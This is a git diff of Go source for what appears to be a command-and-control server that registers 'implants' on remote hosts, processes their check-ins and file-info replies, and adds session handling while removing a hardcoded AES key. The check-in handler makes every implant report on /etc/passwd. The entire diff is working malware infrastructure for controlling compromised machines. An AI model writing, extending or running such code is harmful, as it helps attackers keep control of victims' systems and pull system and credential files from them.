@@ -12,8 +12,8 @@ import (
 )
 
 // we use some clever reflection design so that we do not have to make a huge switch statement containing all possible messageTypes.
-// all message types and their corresponding functions can be called through the map below and the one in serializable.go
-var messageTypeToFunc = map[int]func(net.Conn, interface{}){
+// all message types and their corresponding functions can be called through the map below and the one in lib/serializable.go
+var messageTypeToFunc = map[int]func(net.Conn, interface{}, *session){
 	0: handleImplantRegister,
 	1: handleCheckin,
 	//reserved for implant functionality
@@ -24,7 +24,7 @@ var messageTypeToFunc = map[int]func(net.Conn, interface{}){
 // done.
 func tcpHandler(conn net.Conn) {
 	defer conn.Close()
-	_, messageType, data, err := ReceiveEnvelopeFromImplant(conn, []byte("thisis32bitlongpassphraseimusing")) //TODO: change aes key to a proper one :)
+	messageType, data, session, err := ReceiveEnvelopeFromImplant(conn)
 	if err != nil {
 		log.Printf("[ERROR] Could not understand message sent by implant. Reason: %s", err.Error())
 		return
@@ -32,13 +32,13 @@ func tcpHandler(conn net.Conn) {
 
 	handlerFunc := messageTypeToFunc[messageType]
 
-	handlerFunc(conn, data)
+	handlerFunc(conn, data, session)
 }
 
 //-------------------Begin message handlers--------------------
 
 // Handles envelopes with messageType==0. This is the very first message an implant sends to the server.
-func handleImplantRegister(conn net.Conn, data interface{}) {
+func handleImplantRegister(conn net.Conn, data interface{}, sess *session) {
 	implantRegister, ok := data.(*communication.ImplantRegister)
 	if !ok {
 		log.Printf("[ERROR] Received envelope with messageType=0 (ImplantRegister), but could not convert envelope data to ImplantRegister datastructure")
@@ -64,18 +64,18 @@ func handleImplantRegister(conn net.Conn, data interface{}) {
 }
 
 // Handles envelopes with messageType==1. Every x amount of time, an implant sends a check-in message which this function handles.
-func handleCheckin(conn net.Conn, data interface{}) {
+func handleCheckin(conn net.Conn, data interface{}, sess *session) {
 	implantCheckin, ok := data.(*communication.ImplantCheckin)
 	if !ok {
 		log.Printf("[ERROR] Received envelope with messageType=1 (Checkin), but could not convert envelope data to Checkin datastructure")
 		return
 	}
-	fmt.Println(implantCheckin.ImplantId)
-	RequestFileInfo(conn, "/etc/passwd")
+	log.Printf("[INFO] Handling check-in from implant with ID: %s", implantCheckin.ImplantId)
+	RequestFileInfo(sess, "/etc/passwd")
 }
 
 // Handles envelopes with messageType==12. The implant sends this message when the server sends a request for fileInfo.
-func handleFileInfoResp(conn net.Conn, data interface{}) {
+func handleFileInfoResp(conn net.Conn, data interface{}, sess *session) {
 	fileInfoResp, ok := data.(*communication.FileInfoResp)
 	if !ok {
 		log.Printf("[ERROR] Received envelope with messageType=2 (FileInfoResp), but could not convert envelope data to FileInfoResp datastructure")
